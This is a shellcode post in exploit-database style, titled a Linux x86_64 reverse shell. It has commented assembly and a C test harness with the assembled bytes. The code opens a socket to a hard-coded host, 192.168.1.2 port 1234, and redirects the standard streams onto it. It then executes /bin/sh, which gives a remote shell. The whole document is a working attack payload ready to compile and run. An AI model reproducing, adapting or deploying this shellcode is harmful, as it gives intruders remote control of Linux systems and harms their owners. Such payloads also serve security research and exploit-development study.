/*
# Exploit Title: Shellcode [Linux x86_64 Reverse Shell]
# Date: 19/03/2016
# Shellcode Author: Sudhanshu Chauhan
# LinkedIn: https://in.linkedin.com/in/sudhanshuchauhan
# Tested on: [Ubuntu 14.04.1 x86_64]

global _start


_start:

	;Socket
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
	add rax, 41
	add rdi, 2
	add rsi, 1
	syscall

	; copy socket descriptor
	mov rdi, rax

	; Socket details IP- 192.168.1.2 Port- 1234
	xor rax, rax
	push rax
	mov dword [rsp-4], 0x0201a8c0
	mov word [rsp-6], 0xd204
	sub rsp, 6
	push word 0x2


	;connect
	xor rax, rax
	xor rdx, rdx
	add rax, 42
	mov rsi, rsp
	add rdx, 16
	syscall


    ;duplicate sockets
	xor rax, rax
	add rax, 33
	xor rsi, rsi
	syscall

	mov al, 33
	add rsi, 1
	syscall

	mov al, 33
	add rsi, 1
	syscall

    ; execve
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rax
    mov rdx, rsp
    push rdi
    mov rsi, rsp
    add rax, 59
    syscall

*/

#include <stdio.h>
#include<string.h>
unsigned char code[] = \
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x83\xc0\x29\x48\x83\xc7\x02\x48\x83\xc6\x01\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\xc7\x44\x24\xfc\xc0\xa8\x01\x02\x66\xc7\x44\x24\xfa\x04\xd2\x48\x83\xec\x06\x66\x6a\x02\x48\x31\xc0\x48\x31\xd2\x48\x83\xc0\x2a\x48\x89\xe6\x48\x83\xc2\x10\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x48\x83\xc6\x01\x0f\x05\xb0\x21\x48\x83\xc6\x01\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

main()
{
    printf("Shellcode Length: %d\n", (int)sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}